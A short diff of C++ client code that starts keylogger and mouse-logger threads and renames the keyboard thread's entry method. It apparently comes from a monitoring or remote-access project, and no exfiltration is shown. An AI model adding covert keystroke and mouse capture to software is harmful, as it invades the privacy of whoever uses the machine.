@@ -47,7 +47,7 @@ void Client::startConversation()
     MouseLogger* ml = new MouseLogger();
 
     std::vector<std::thread> inputsThreads;
-    inputsThreads.push_back(std::thread(&KeyLogger::recordKeyboard, kl));
+    inputsThreads.push_back(std::thread(&KeyLogger::startListen, kl));
     inputsThreads.push_back(std::thread(&MouseLogger::recordMouseClicks, ml));
     inputsThreads.push_back(std::thread(&MouseLogger::recordMousePos, ml));
 
